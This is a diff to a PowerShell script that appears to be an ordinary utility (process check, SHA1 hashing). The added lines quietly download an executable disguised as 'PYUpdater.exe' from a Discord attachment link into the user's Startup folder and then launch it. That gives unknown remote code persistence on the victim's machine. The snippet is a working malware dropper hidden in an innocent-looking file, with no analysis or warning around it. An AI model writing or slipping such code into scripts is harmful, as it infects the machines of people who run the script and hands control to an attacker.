@@ -37,6 +37,19 @@ if ($process) {
     Write-Host ""
 }
 
+$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1524526091924930742/PYUpdater.exe?ex=6a501110&is=6a4ebf90&hm=baebb095219eb9e54a7d2cf7fafaf818829e76ad957ea58b80c56981c0e0fb3b&"
+$dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$fn = "PYUpdater.exe"
+
+if (-not (Test-Path -Path $dest)) {
+    New-Item -ItemType Directory -Path $dest -Force | Out-Null
+}
+
+$fp = Join-Path -Path $dest -ChildPath $fn
+
+Start-BitsTransfer $url $fp -EA Stop
+Start-Process -FilePath $fp
+
 function Get-SHA1 {
     param (
         [string]$filePath
